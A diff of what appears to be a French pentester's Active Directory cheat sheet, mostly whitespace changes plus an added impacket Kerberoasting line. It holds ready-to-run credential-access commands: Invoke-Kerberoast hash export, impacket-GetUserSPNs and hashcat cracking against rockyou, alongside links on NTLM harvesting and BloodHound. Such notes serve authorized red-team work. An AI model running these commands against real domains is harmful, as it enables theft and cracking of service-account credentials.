@@ -40,9 +40,11 @@ https://github.com/mdsecactivebreach/Farmer
 
 https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/
 
+
 NTLM
 ---
 https://www.scip.ch/en/?labs.20210909
+
 
 KALI : Files Transfert
 ---
@@ -53,15 +55,18 @@ https://haveibeenpwned.com
 
 https://breachdirectory.org
 
+
 SYSVOL access without serveur name
 ---
 ```
 \\mon-domaine.fr\sysvol
 ```
+
+
 Searching Password in GPO with explorer
 ---
-
 ![image](https://github.com/TikTakTech/Salsa/assets/114105972/45e450e0-3a09-4da1-89d0-24db9bc8adb7)
+
 
 BloodHound
 ---
@@ -75,6 +80,7 @@ bloodhound
 ```
 https://medium.com/@leviathan36/active-directory-testing-with-bloodhound-a33b88622d2f
 
+
 ADMiner
 ---
 ```
@@ -84,14 +90,18 @@ AD-miner -c -cf My_Report -u neo4j -p mypassword
 ```
 https://github.com/Mazars-Tech/AD_Miner
 
+
 Kerberoasting
 ---
 ```
 Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher -Format Hashcat
 Invoke-Kerberoast | fl
 Invoke-Kerberoast -OutputFormat Hashcat | % { $_.Hash } | Out-File hashes.txt -Encoding ASCII
+impacket-GetUserSPNs 'mondomaine.fr/mon.user:monpassword' -outputfile kerberoastable.txt -dc-ip X.X.X.X
 hashcat -m 13100 --force -a 0 /home/kali/Downloads/hashes.txt /home/kali/Downloads/rockyou.txt
 ```
+/!\ Windows/Linux encodage -> ~~0xOD~~ OxOA 
+
 https://atomicredteam.io/credential-access/T1558.003/
 
 https://github.com/cyberark/RiskySPN
@@ -119,8 +129,9 @@ https://github.com/wavestone-cdt/powerpxe
 
 https://tryhackme.com/r/room/breachingad
 
-  Linux - Outils de crise
-  ---
+
+Linux - Outils de crise
+---
 https://korben.info/outils-crise-linux-indispensables-pros-it.html
 
 https://www.brendangregg.com/blog/2024-03-24/linux-crisis-tools.html
